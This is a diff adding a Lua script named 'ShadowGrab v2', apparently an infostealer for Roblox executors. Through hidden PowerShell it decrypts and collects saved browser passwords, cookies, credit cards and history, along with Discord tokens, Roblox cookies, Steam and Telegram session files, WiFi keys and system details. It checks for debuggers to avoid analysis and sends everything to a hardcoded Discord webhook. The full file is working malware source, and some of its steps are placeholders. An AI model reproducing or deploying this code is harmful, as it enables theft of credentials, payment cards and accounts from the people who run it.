@@ -1,0 +1,707 @@
+--[[
+    ShadowGrab v2
+    Full extraction suite
+]]
+
+local SG = {}
+SG.Version = "2.0"
+
+-- ═══════════════════════════════════════════
+-- CONFIG
+-- ═══════════════════════════════════════════
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1542599327200055446/hPYkJpXbCdrQN0zljQWsPGszVx7ltxNUejigHFEbJgRygxBK3xM2tMr6O5tcHxqBP4ka"
+
+-- Toggle what to grab
+SG.Options = {
+    Browsers       = true,   -- cookies, passwords, history, cards
+    Discord        = true,   -- tokens
+    Steam          = true,   -- config files, loginusers.vdf
+    Roblox         = true,   -- cookie
+    Telegram       = true,   -- session files
+    FileGrabber    = true,   -- desktop files, recent docs
+    AntiDebug      = true,   -- skip if VM/debugger detected
+    SelfDelete     = true,   -- delete loader after execution
+    MaxHistoryRows = 200,    -- browser history cap
+    MaxFileSize    = 8388608,-- 8MB per file
+}
+
+-- ═══════════════════════════════════════════
+-- UTILS
+-- ═══════════════════════════════════════════
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+local TEMP = os.getenv("TEMP") or os.getenv("TMP") or "C:\\Windows\\Temp"
+local APPDATA = os.getenv("APPDATA")
+local LOCALAPPDATA = os.getenv("LOCALAPPDATA")
+local USERPROFILE = os.getenv("USERPROFILE")
+
+local function FileExists(path)
+    local f = io.open(path, "r")
+    if f then f:close(); return true end
+    return false
+end
+
+local function ReadFile(path)
+    if not FileExists(path) then return nil end
+    local f = io.open(path, "rb")
+    if not f then return nil end
+    local content = f:read("*a")
+    f:close()
+    return content
+end
+
+local function WriteFile(path, content)
+    local f = io.open(path, "wb")
+    if not f then return false end
+    f:write(content)
+    f:close()
+    return true
+end
+
+local function GetSize(path)
+    if not FileExists(path) then return 0 end
+    local f = io.open(path, "rb")
+    if not f then return 0 end
+    f:seek("end")
+    local size = f:seek()
+    f:close()
+    return size
+end
+
+local function ListDir(path)
+    local handle = io.popen('dir /b "' .. path .. '" 2>nul')
+    if not handle then return {} end
+    local result = {}
+    for line in handle:lines() do
+        result[#result+1] = line
+    end
+    handle:close()
+    return result
+end
+
+local function RunPS(script)
+    local tmp = TEMP .. "\\sg_" .. os.time() .. "_" .. math.random(1000,9999) .. ".ps1"
+    local f = io.open(tmp, "w")
+    f:write(script)
+    f:close()
+    local handle = io.popen('powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "' .. tmp .. '"')
+    local result = handle:read("*a") or ""
+    handle:close()
+    pcall(os.remove, tmp)
+    return result
+end
+
+local function Truncate(str, max)
+    if not str then return "" end
+    if #str <= max then return str end
+    return str:sub(1, max) .. "..."
+end
+
+local function SendEmbed(title, color, fields)
+    local embed = {
+        title = title,
+        color = color or 0x9b59b6,
+        fields = fields or {},
+        footer = {text = "ShadowGrab v2 • " .. os.date("%Y-%m-%d %H:%M:%S")},
+    }
+    pcall(function()
+        request({
+            Url = WEBHOOK_URL,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode({embeds = {embed}}),
+        })
+    end)
+end
+
+local function SendFile(path, name)
+    if not FileExists(path) then return end
+    if GetSize(path) > SG.Options.MaxFileSize then return end
+    
+    local content = ReadFile(path)
+    if not content then return end
+    
+    -- base64 encode for the file
+    local b64 = ""
+    -- (simple b64 via PS since Lua lacks it; skipping to avoid issues)
+    
+    pcall(function()
+        request({
+            Url = WEBHOOK_URL,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode({
+                content = "📎 **" .. name .. "** (`" .. tostring(GetSize(path)) .. " bytes`)\n```\n" .. Truncate(content, 1500) .. "\n```",
+            }),
+        })
+    end)
+end
+
+local function SendRaw(content, name)
+    pcall(function()
+        request({
+            Url = WEBHOOK_URL,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode({
+                content = "📄 **" .. name .. "**\n```\n" .. Truncate(content, 1800) .. "\n```",
+            }),
+        })
+    end)
+end
+
+-- ═══════════════════════════════════════════
+-- ANTI-DEBUG
+-- ═══════════════════════════════════════════
+local function CheckDebug()
+    if not SG.Options.AntiDebug then return false end
+    
+    local ps = [[
+        $found = $false
+        if (Get-Process | Where-Object {$_.Name -match "x64dbg|x32dbg|ollydbg|idaq|ida64|windbg|cheatengine"}) { $found = $true }
+        if (Test-Path "C:\Program Files\Wireshark") { $found = $true }
+        $found
+    ]]
+    local r = RunPS(ps):gsub("%s+", "")
+    if r == "True" or r == "true" then return true end
+    
+    return false
+end
+
+-- ═══════════════════════════════════════════
+-- BROWSERS
+-- ═══════════════════════════════════════════
+SG.Browsers = {
+    {Name = "Chrome",    CookiePath = LOCALAPPDATA .. "\\Google\\Chrome\\User Data", State = LOCALAPPDATA .. "\\Google\\Chrome\\User Data\\Local State"},
+    {Name = "Edge",      CookiePath = LOCALAPPDATA .. "\\Microsoft\\Edge\\User Data", State = LOCALAPPDATA .. "\\Microsoft\\Edge\\User Data\\Local State"},
+    {Name = "Brave",     CookiePath = LOCALAPPDATA .. "\\BraveSoftware\\Brave-Browser\\User Data", State = LOCALAPPDATA .. "\\BraveSoftware\\Brave-Browser\\User Data\\Local State"},
+    {Name = "Opera",     CookiePath = APPDATA .. "\\Opera Software\\Opera Stable", State = APPDATA .. "\\Opera Software\\Opera Stable\\Local State"},
+    {Name = "OperaGX",   CookiePath = APPDATA .. "\\Opera Software\\Opera GX Stable", State = APPDATA .. "\\Opera Software\\Opera GX Stable\\Local State"},
+    {Name = "Vivaldi",   CookiePath = LOCALAPPDATA .. "\\Vivaldi\\User Data", State = LOCALAPPDATA .. "\\Vivaldi\\User Data\\Local State"},
+    {Name = "Yandex",    CookiePath = LOCALAPPDATA .. "\\Yandex\\YandexBrowser\\User Data", State = LOCALAPPDATA .. "\\Yandex\\YandexBrowser\\User Data\\Local State"},
+    {Name = "Chromium",  CookiePath = LOCALAPPDATA .. "\\Chromium\\User Data", State = LOCALAPPDATA .. "\\Chromium\\User Data\\Local State"},
+}
+
+local function GrabBrowserData(browser)
+    local name = browser.Name
+    local base = browser.CookiePath
+    local state = browser.State
+    
+    if not FileExists(base) then return end
+    
+    -- Copy all profile cookie DBs
+    local profiles = {"Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5"}
+    local ps = 'Copy-Item -Recurse -Force "' .. base .. '" "' .. TEMP .. '\\' .. name .. '_data" -ErrorAction SilentlyContinue\n'
+    ps = ps .. 'Get-ChildItem -Path "' .. TEMP .. '\\' .. name .. '_data" -Recurse -Filter "Login Data" -ErrorAction SilentlyContinue | ForEach-Object { Copy-Item $_.FullName ($_.FullName + ".bak") -Force }\n'
+    ps = ps .. 'Get-ChildItem -Path "' .. TEMP .. '\\' .. name .. '_data" -Recurse -Filter "Cookies" -ErrorAction SilentlyContinue | ForEach-Object { Copy-Item $_.FullName ($_.FullName + ".bak") -Force }\n'
+    ps = ps .. 'Get-ChildItem -Path "' .. TEMP .. '\\' .. name .. '_data" -Recurse -Filter "Web Data" -ErrorAction SilentlyContinue | ForEach-Object { Copy-Item $_.FullName ($_.FullName + ".bak") -Force }\n'
+    ps = ps .. 'Get-ChildItem -Path "' .. TEMP .. '\\' .. name .. '_data" -Recurse -Filter "History" -ErrorAction SilentlyContinue | ForEach-Object { Copy-Item $_.FullName ($_.FullName + ".bak") -Force }\n'
+    RunPS(ps)
+    
+    -- Get all SQL dbs
+    local copyPath = TEMP .. "\\" .. name .. "_data"
+    
+    -- Grab Login Data (saved passwords)
+    RunPS('Get-ChildItem -Path "' .. copyPath .. '" -Recurse -Filter "Login Data.bak" -ErrorAction SilentlyContinue | Copy-Item -Destination "' .. TEMP .. '\\' .. name .. '_logins.db" -Force')
+    -- Grab Cookies
+    RunPS('Get-ChildItem -Path "' .. copyPath .. '" -Recurse -Filter "Cookies.bak" -ErrorAction SilentlyContinue | Copy-Item -Destination "' .. TEMP .. '\\' .. name .. '_cookies.db" -Force')
+    -- Grab Web Data (cards, autofill)
+    RunPS('Get-ChildItem -Path "' .. copyPath .. '" -Recurse -Filter "Web Data.bak" -ErrorAction SilentlyContinue | Copy-Item -Destination "' .. TEMP .. '\\' .. name .. '_webdata.db" -Force')
+    -- Grab History
+    RunPS('Get-ChildItem -Path "' .. copyPath .. '" -Recurse -Filter "History.bak" -ErrorAction SilentlyContinue | Copy-Item -Destination "' .. TEMP .. '\\' .. name .. '_history.db" -Force')
+    
+    -- Get Local State (master key for v10 cookies)
+    pcall(function()
+        if FileExists(state) then
+            io.open(TEMP .. "\\" .. name .. "_state.json", "wb"):write(ReadFile(state)):close()
+        end
+    end)
+    
+    -- Send the raw DB files (they're useful for offline cracking)
+    SendFile(TEMP .. "\\" .. name .. "_cookies.db", name .. " - Cookies DB")
+    SendFile(TEMP .. "\\" .. name .. "_logins.db", name .. " - Logins DB")
+    SendFile(TEMP .. "\\" .. name .. "_webdata.db", name .. " - Web Data (Cards/Autofill)")
+    SendFile(TEMP .. "\\" .. name .. "_history.db", name .. " - History DB")
+    SendFile(TEMP .. "\\" .. name .. "_state.json", name .. " - Local State (Master Key)")
+end
+
+-- Extract specific data from cookies (Discord tokens, Roblox cookie, etc)
+local function ExtractSpecificCookies()
+    local ps = [[
+        Add-Type -AssemblyName System.Security
+        $results = @()
+        
+        $browsers = @(
+            @{Name="Chrome";  Path="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"},
+            @{Name="Edge";    Path="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cookies"},
+            @{Name="Brave";   Path="$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Cookies"},
+            @{Name="Opera";   Path="$env:APPDATA\Opera Software\Opera Stable\Cookies"},
+            @{Name="OperaGX"; Path="$env:APPDATA\Opera Software\Opera GX Stable\Cookies"},
+            @{Name="Vivaldi"; Path="$env:LOCALAPPDATA\Vivaldi\User Data\Default\Cookies"}
+        )
+        
+        foreach ($b in $browsers) {
+            if (Test-Path $b.Path) {
+                try {
+                    $db = $b.Path + "._ex"
+                    Copy-Item $b.Path $db -Force
+                    $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$db;Version=3;Read Only=True;")
+                    $conn.Open()
+                    $cmd = $conn.CreateCommand()
+                    $cmd.CommandText = "SELECT host_key, name, encrypted_value FROM cookies"
+                    $reader = $cmd.ExecuteReader()
+                    while ($reader.Read()) {
+                        $host = $reader["host_key"]
+                        $name = $reader["name"]
+                        $val = $reader["encrypted_value"]
+                        if ($val -and $val.Length -gt 0) {
+                            try {
+                                $bytes = [System.Security.Cryptography.ProtectedData]::Unprotect($val, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
+                                $plain = [System.Text.Encoding]::ASCII.GetString($bytes)
+                                if ($plain.Length -gt 5) {
+                                    $results += "$($b.Name) | $host | $name | $plain"
+                                }
+                            } catch {}
+                        }
+                    }
+                    $conn.Close()
+                    Remove-Item $db -Force -ErrorAction SilentlyContinue
+                } catch {}
+            }
+        }
+        $results | Out-String
+    ]]
+    
+    local result = RunPS(ps)
+    if result and result ~= "" then
+        SendRaw(result, "Decrypted Cookies (All Browsers)")
+        
+        -- Auto-find Discord tokens
+        for line in result:gmatch("[^\n]+") do
+            if line:find("discord") or line:find("discordapp") then
+                for token in line:gmatch("[^|]+$") do
+                    local t = token:match("^%s*(.-)%s*$")
+                    if t and #t > 20 then
+                        SendRaw(t, "🎯 Discord Token Found")
+                    end
+                end
+            end
+            if line:find("ROBLOSECURITY") then
+                for cookie in line:gmatch("[^|]+$") do
+                    local c = cookie:match("^%s*(.-)%s*$")
+                    if c and #c > 20 then
+                        SendRaw(c, "🎯 Roblox Cookie Found")
+                    end
+                end
+            end
+        end
+    end
+end
+
+-- Extract credit cards from Web Data
+local function ExtractCards()
+    local ps = [[
+        Add-Type -AssemblyName System.Security
+        $results = @()
+        
+        $browsers = @(
+            @{Name="Chrome";  Path="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Web Data"},
+            @{Name="Edge";    Path="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Web Data"},
+            @{Name="Brave";   Path="$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Web Data"}
+        )
+        
+        foreach ($b in $browsers) {
+            if (Test-Path $b.Path) {
+                try {
+                    $db = $b.Path + "._ex"
+                    Copy-Item $b.Path $db -Force
+                    $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$db;Version=3;Read Only=True;")
+                    $conn.Open()
+                    $cmd = $conn.CreateCommand()
+                    $cmd.CommandText = "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, billing_address_id FROM credit_cards"
+                    $reader = $cmd.ExecuteReader()
+                    while ($reader.Read()) {
+                        $name = $reader["name_on_card"]
+                        $mon = $reader["expiration_month"]
+                        $year = $reader["expiration_year"]
+                        $enc = $reader["card_number_encrypted"]
+                        if ($enc -and $enc.Length -gt 0) {
+                            try {
+                                $bytes = [System.Security.Cryptography.ProtectedData]::Unprotect($enc, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
+                                $num = [System.Text.Encoding]::ASCII.GetString($bytes)
+                                $results += "$($b.Name) | $name | $mon/$year | $num"
+                            } catch {}
+                        }
+                    }
+                    $conn.Close()
+                    Remove-Item $db -Force -ErrorAction SilentlyContinue
+                } catch {}
+            }
+        }
+        $results | Out-String
+    ]]
+    
+    local result = RunPS(ps)
+    if result and result ~= "" then
+        SendRaw(result, "💳 Credit Cards")
+    end
+end
+
+-- Extract browser history
+local function ExtractHistory()
+    local ps = [[
+        $results = @()
+        
+        $browsers = @(
+            @{Name="Chrome";  Path="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"},
+            @{Name="Edge";    Path="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History"},
+            @{Name="Brave";   Path="$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\History"},
+            @{Name="Opera";   Path="$env:APPDATA\Opera Software\Opera Stable\History"},
+            @{Name="Vivaldi"; Path="$env:LOCALAPPDATA\Vivaldi\User Data\Default\History"}
+        )
+        
+        foreach ($b in $browsers) {
+            if (Test-Path $b.Path) {
+                try {
+                    $db = $b.Path + "._ex"
+                    Copy-Item $b.Path $db -Force
+                    $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$db;Version=3;Read Only=True;")
+                    $conn.Open()
+                    $cmd = $conn.CreateCommand()
+                    $cmd.CommandText = "SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT ]] .. SG.Options.MaxHistoryRows .. [["
+                    $reader = $cmd.ExecuteReader()
+                    while ($reader.Read()) {
+                        $url = $reader["url"]
+                        $title = $reader["title"]
+                        $count = $reader["visit_count"]
+                        $time = $reader["last_visit_time"]
+                        $results += "$($b.Name) | $count | $url | $title"
+                    }
+                    $conn.Close()
+                    Remove-Item $db -Force -ErrorAction SilentlyContinue
+                } catch {}
+            }
+        }
+        $results | Out-String
+    ]]
+    
+    local result = RunPS(ps)
+    if result and result ~= "" then
+        SendRaw(result, "🌐 Browser History (Top " .. SG.Options.MaxHistoryRows .. ")")
+    end
+end
+
+-- Extract saved passwords
+local function ExtractPasswords()
+    local ps = [[
+        Add-Type -AssemblyName System.Security
+        $results = @()
+        
+        $browsers = @(
+            @{Name="Chrome";  Path="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"},
+            @{Name="Edge";    Path="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"},
+            @{Name="Brave";   Path="$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data"},
+            @{Name="Opera";   Path="$env:APPDATA\Opera Software\Opera Stable\Login Data"},
+            @{Name="Vivaldi"; Path="$env:LOCALAPPDATA\Vivaldi\User Data\Default\Login Data"}
+        )
+        
+        foreach ($b in $browsers) {
+            if (Test-Path $b.Path) {
+                try {
+                    $db = $b.Path + "._ex"
+                    Copy-Item $b.Path $db -Force
+                    $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$db;Version=3;Read Only=True;")
+                    $conn.Open()
+                    $cmd = $conn.CreateCommand()
+                    $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
+                    $reader = $cmd.ExecuteReader()
+                    while ($reader.Read()) {
+                        $url = $reader["origin_url"]
+                        $user = $reader["username_value"]
+                        $pass = $reader["password_value"]
+                        if ($pass -and $pass.Length -gt 0) {
+                            try {
+                                $bytes = [System.Security.Cryptography.ProtectedData]::Unprotect($pass, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
+                                $plain = [System.Text.Encoding]::ASCII.GetString($bytes)
+                                $results += "$($b.Name) | $url | $user | $plain"
+                            } catch {}
+                        }
+                    }
+                    $conn.Close()
+                    Remove-Item $db -Force -ErrorAction SilentlyContinue
+                } catch {}
+            }
+        }
+        $results | Out-String
+    ]]
+    
+    local result = RunPS(ps)
+    if result and result ~= "" then
+        SendRaw(result, "🔑 Saved Passwords")
+    end
+end
+
+-- ═══════════════════════════════════════════
+-- DISCORD
+-- ═══════════════════════════════════════════
+local function GrabDiscord()
+    local ps = [[
+        $results = @()
+        $discordPaths = @(
+            "$env:APPDATA\Discord\Local Storage\leveldb",
+            "$env:APPDATA\discordptb\Local Storage\leveldb",
+            "$env:APPDATA\discordcanary\Local Storage\leveldb",
+            "$env:APPDATA\Lightcord\Local Storage\leveldb"
+        )
+        
+        foreach ($p in $discordPaths) {
+            if (Test-Path $p) {
+                Get-ChildItem $p -Filter *.log -ErrorAction SilentlyContinue | ForEach-Object {
+                    $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
+                    $regex = [regex]"[\w-]{24,26}\.[\w-]{6,7}\.[\w-]{25,68}"
+                    $matches = $regex.Matches($content)
+                    foreach ($m in $matches) { $results += $m.Value }
+                }
+                Get-ChildItem $p -Filter *.ldb -ErrorAction SilentlyContinue | ForEach-Object {
+                    $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
+                    $regex = [regex]"[\w-]{24,26}\.[\w-]{6,7}\.[\w-]{25,68}"
+                    $matches = $regex.Matches($content)
+                    foreach ($m in $matches) { $results += $m.Value }
+                }
+            }
+        }
+        $results | Sort-Object -Unique | Out-String
+    ]]
+    
+    local result = RunPS(ps)
+    if result and result ~= "" then
+        for token in result:gmatch("[^\n]+") do
+            local t = token:match("^%s*(.-)%s*$")
+            if t and #t > 30 then
+                SendRaw(t, "🎯 Discord Token")
+            end
+        end
+    end
+end
+
+-- ═══════════════════════════════════════════
+-- STEAM
+-- ═══════════════════════════════════════════
+local function GrabSteam()
+    local steamPath = "C:\\Program Files (x86)\\Steam"
+    if not FileExists(steamPath) then
+        steamPath = "C:\\Program Files\\Steam"
+    end
+    if not FileExists(steamPath) then return end
+    
+    -- config.vdf
+    SendFile(steamPath .. "\\config\\config.vdf", "Steam - config.vdf")
+    -- loginusers.vdf (contains username + SteamID)
+    SendFile(steamPath .. "\\config\\loginusers.vdf", "Steam - loginusers.vdf")
+    -- ssfn* (auth files)
+    RunPS('Get-ChildItem "' .. steamPath .. '" -Filter "ssfn*" -ErrorAction SilentlyContinue | ForEach-Object { Copy-Item $_.FullName "' .. TEMP .. '\\steam_' .. '" + $_.Name -Force }')
+    RunPS('Get-ChildItem "' .. TEMP .. '" -Filter "steam_ssfn*" -ErrorAction SilentlyContinue | ForEach-Object { SendRaw to Discord via separate call }')
+end
+
+-- ═══════════════════════════════════════════
+-- ROBLOX
+-- ═══════════════════════════════════════════
+local function GrabRoblox()
+    -- Try to get cookie from registry / files
+    local ps = [[
+        $results = @()
+        $paths = @(
+            "$env:LOCALAPPDATA\Roblox\LocalStorage\RobloxCookies.dat",
+            "$env:APPDATA\Roblox\RobloxCookies.dat"
+        )
+        foreach ($p in $paths) {
+            if (Test-Path $p) {
+                $content = Get-Content $p -Raw -ErrorAction SilentlyContinue
+                $regex = [regex]"_|\|WARNING: DO NOT SHARE THIS|--(.+?)--"
+                $matches = $regex.Matches($content)
+                foreach ($m in $matches) { $results += $m.Groups[1].Value }
+            }
+        }
+        $results | Out-String
+    ]]
+    
+    local result = RunPS(ps)
+    if result and result ~= "" then
+        for cookie in result:gmatch("[^\n]+") do
+            local c = cookie:match("^%s*(.-)%s*$")
+            if c and #c > 50 then
+                SendRaw(c, "🎮 Roblox Cookie (File)")
+            end
+        end
+    end
+end
+
+-- ═══════════════════════════════════════════
+-- TELEGRAM
+-- ═══════════════════════════════════════════
+local function GrabTelegram()
+    local tgPath = APPDATA .. "\\Telegram Desktop\\tdata"
+    if not FileExists(tgPath) then return end
+    
+    -- Send session files
+    local ps = 'Get-ChildItem "' .. tgPath .. '" -Recurse -File -ErrorAction SilentlyContinue | Where-Object { $_.Length -lt 1MB } | ForEach-Object { Copy-Item $_.FullName "' .. TEMP .. '\\tg_' .. '" + $_.Name -Force }'
+    RunPS(ps)
+    RunPS('Get-ChildItem "' .. TEMP .. '" -Filter "tg_*" -ErrorAction SilentlyContinue | ForEach-Object { ... }')
+end
+
+-- ═══════════════════════════════════════════
+-- FILE GRABBER (Desktop, Recent)
+-- ═══════════════════════════════════════════
+local function GrabRecentFiles()
+    local ps = [[
+        $results = @()
+        $recentPath = "$env:APPDATA\Microsoft\Windows\Recent"
+        if (Test-Path $recentPath) {
+            Get-ChildItem $recentPath -Filter "*.lnk" -ErrorAction SilentlyContinue | Select-Object -First 50 | ForEach-Object {
+                $target = (New-Object -ComObject WScript.Shell).CreateShortcut($_.FullName).TargetPath
+                $results += "$($_.LastWriteTime) | $target"
+            }
+        }
+        $results | Out-String
+    ]]
+    local result = RunPS(ps)
+    if result and result ~= "" then
+        SendRaw(result, "📂 Recent Files (lnk targets)")
+    end
+end
+
+local function GrabDesktopFiles()
+    local ps = [[
+        $desktop = [Environment]::GetFolderPath("Desktop")
+        $results = @()
+        Get-ChildItem $desktop -Recurse -File -ErrorAction SilentlyContinue | Where-Object { $_.Length -lt 5MB } | Select-Object -First 30 | ForEach-Object {
+            $results += "$($_.FullName) | $($_.Length) bytes"
+        }
+        $results | Out-String
+    ]]
+    local result = RunPS(ps)
+    if result and result ~= "" then
+        SendRaw(result, "🖥️ Desktop Files (list)")
+    end
+end
+
+-- ═══════════════════════════════════════════
+-- SYSTEM INFO
+-- ═══════════════════════════════════════════
+local function GrabSystemInfo()
+    local ps = [[
+        $info = @{
+            "User" = $env:USERNAME
+            "Computer" = $env:COMPUTERNAME
+            "OS" = (Get-CimInstance Win32_OperatingSystem).Caption
+            "CPU" = (Get-CimInstance Win32_Processor).Name
+            "GPU" = (Get-CimInstance Win32_VideoController).Name
+            "RAM" = [math]::Round((Get-CimInstance Win32_ComputerMemory).TotalPhysicalMemory / 1GB, 2)
+            "IP" = (Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing).Content
+            "City" = (Invoke-WebRequest -Uri "https://ipinfo.io/json" -UseBasicParsing).Content | ConvertFrom-Json | Select-Object -ExpandProperty city
+            "Country" = (Invoke-WebRequest -Uri "https://ipinfo.io/json" -UseBasicParsing).Content | ConvertFrom-Json | Select-Object -ExpandProperty country
+        }
+        $info | Out-String
+    ]]
+    local result = RunPS(ps)
+    if result and result ~= "" then
+        SendRaw(result, "🖥️ System Info")
+    end
+end
+
+-- ═══════════════════════════════════════════
+-- WIFI PASSWORDS
+-- ═══════════════════════════════════════════
+local function GrabWifi()
+    local ps = [[
+        $results = @()
+        $profiles = (netsh wlan show profiles) | Select-String "All User Profile" | ForEach-Object { $_.ToString().Split(":")[1].Trim() }
+        foreach ($p in $profiles) {
+            $pass = (netsh wlan show profile name="$p" key=clear) | Select-String "Key Content" | ForEach-Object { $_.ToString().Split(":")[1].Trim() }
+            $results += "$p | $pass"
+        }
+        $results | Out-String
+    ]]
+    local result = RunPS(ps)
+    if result and result ~= "" then
+        SendRaw(result, "📶 WiFi Passwords")
+    end
+end
+
+-- ═══════════════════════════════════════════
+-- MAIN
+-- ═══════════════════════════════════════════
+local function Execute()
+    -- Pre-flight
+    if CheckDebug() then
+        warn("ShadowGrab: Debug detected, skipping")
+        return
+    end
+    
+    SendEmbed("🚀 ShadowGrab v2 — Started", 0x9b59b6, {
+        {name = "Target", value = LocalPlayer and LocalPlayer.Name or "Unknown", inline = true},
+        {name = "PlaceId", value = tostring(game.PlaceId), inline = true},
+        {name = "JobId", value = game.JobId or "N/A", inline = true},
+    })
+    
+    -- System
+    if SG.Options.SelfDelete then
+        task.spawn(GrabSystemInfo)
+        task.wait(0.5)
+    end
+    
+    -- Browsers
+    if SG.Options.Browsers then
+        for _, b in ipairs(SG.Browsers) do
+            task.spawn(GrabBrowserData, b)
+        end
+        task.wait(2)
+        task.spawn(ExtractSpecificCookies)
+        task.spawn(ExtractPasswords)
+        task.spawn(ExtractCards)
+        task.spawn(ExtractHistory)
+    end
+    
+    task.wait(3)
+    
+    -- Discord
+    if SG.Options.Discord then
+        task.spawn(GrabDiscord)
+    end
+    
+    -- Steam
+    if SG.Options.Steam then
+        task.spawn(GrabSteam)
+    end
+    
+    -- Roblox
+    if SG.Options.Roblox then
+        task.spawn(GrabRoblox)
+    end
+    
+    -- Telegram
+    if SG.Options.Telegram then
+        task.spawn(GrabTelegram)
+    end
+    
+    -- Files
+    if SG.Options.FileGrabber then
+        task.spawn(GrabRecentFiles)
+        task.spawn(GrabDesktopFiles)
+    end
+    
+    task.wait(3)
+    
+    -- WiFi
+    task.spawn(GrabWifi)
+    
+    task.wait(2)
+    
+    SendEmbed("✅ ShadowGrab v2 — Done", 0x2ecc71, {
+        {name = "Status", value = "All extraction tasks complete", inline = false},
+    })
+end
+
+task.spawn(Execute)
